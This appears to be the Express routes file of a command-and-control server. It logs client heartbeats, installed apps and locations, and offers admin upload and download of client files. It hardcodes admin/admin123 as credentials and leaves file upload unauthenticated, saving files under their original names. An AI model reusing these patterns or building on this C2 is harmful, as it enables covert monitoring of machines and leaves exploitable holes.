/**
 * General routes.
 */
"use strict";

const express = require("express");
const session = require('express-session');
const router  = express.Router();
const c2 = require("../src/c2.js");
const cli = require("../src/cli.js")
const bodyParser = require("body-parser");
const path = require('path');

const urlencodedParser = bodyParser.urlencoded({ extended: false });
const multer = require("multer");

const applist = require('../src/applist.js');

router.use(session({
    secret: 'yourSecretKey',
    resave: false,
    saveUninitialized: true,
}));

let clients = {};

router.post('/check-watchlist', urlencodedParser, async (req, res) => {
    const clientInfo = await c2.getClientInfo()
    await cli.updateClientData(clientInfo);

    const isOnWatchlist = await cli.checkWatchlist(clientInfo);

    if (isOnWatchlist === false) {
      console.log(`Client: ${clientInfo.clientid} is not on watchlist`)
    }

    res.json({ onWatchlist: isOnWatchlist });
});


router.post('/connect', urlencodedParser, async (req, res) => {
    const { clientid } = req.body;
    const clientInfo = await c2.getClientInfo()
    const apps = await applist.getInstalledApps()

    clients[clientid] = { lastHeartbeat: Date.now() };
    console.log('Received client info:', clientInfo);

    await cli.updateClientOnline(clientInfo);
    await cli.saveInstalledApps(clientInfo.clientid, apps);

    c2.logToFile("Connected to server successfully", clientInfo.clientid);
    res.json({ message: 'Client connected successfully!' });
});

router.post('/heartbeat', urlencodedParser, async (req, res) => {
    const { clientid } = req.body;

    if (clients[clientid]) {
      clients[clientid].lastHeartbeat = Date.now();
    }

    const clientInfo = await c2.getClientInfo()
    console.log('Received client info:', clientInfo);

    await cli.updateClientData(clientInfo);
    await c2.logToFile("Heartbeat sent:", clientInfo.clientid);
    res.json({ message: 'Heartbeat received' });
});



async function checkForDisconnectedClients() {

    const currentTime = Date.now();
    
    for (const clientid in clients) {
      const lastHeartbeat = clients[clientid].lastHeartbeat;

      if (currentTime - lastHeartbeat > 10000) {
        await cli.updateClientOffline({clientid});
        console.log(`Client ${clientid} has been disconnected.`);

        await c2.logToFile("Logged out", clientid)
        delete clients[clientid];
      }
    }
  }
  

  setInterval(checkForDisconnectedClients, 2500);
  


  const users = { admin: 'admin123' };

  router.post('/login', express.json(), (req, res) => {
      const { username, password } = req.body;
      if (users[username] && users[username] === password) {
          req.session.user = username;
          return res.json({ success: true });
      }
      res.json({ success: false });
  });

  function isAuthenticated(req, res, next) {
      if (req.session.user) {
          return next();
      }
      res.redirect('/login.html');
  }


const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, path.join(__dirname, '../uploads'));
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname);
    }
});

const upload = multer({ storage: storage });


router.post('/upload', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ message: 'No file uploaded' });
    }

    console.log('File uploaded:', req.file);
    res.json({ message: 'File uploaded successfully', file: req.file });
    c2.logToFile(`${req.file.originalname} uploaded`, "admin")
    cli.logToClientFile(`Admin uploaded: ${req.file.originalname}`, )
});

router.get('/admin', isAuthenticated, (req, res) => {
    res.sendFile(path.join(__dirname, '../public/admin.html'));
});


router.get('/download/:clientid', isAuthenticated, async (req, res) => {
    const clientId = req.params.clientid;
    const clientDetails = await cli.getClientDetails(clientId);
    res.render('download', { 
        clientDetails: { 
            clientid: clientDetails.clientid,
            location: clientDetails.location,
            online_time: clientDetails.online_time,
            offline_time: clientDetails.offline_time,
            watchlist: clientDetails.watchlist,
            installed_apps: clientDetails.installed_apps
        } 
    });
});

router.get('/download-app/:clientid/:filename', isAuthenticated, async (req, res) => {
    const filename = req.params.filename;
    
    const installedApps = await applist.getInstalledApps();

    const fileToDownload = installedApps.find(app => path.basename(app) === filename);

    if (fileToDownload) {
        res.download(fileToDownload, filename, () => {
            c2.logToFile(`Downloaded file: ${filename}`, "admin")
        });
    }
});


module.exports = router;
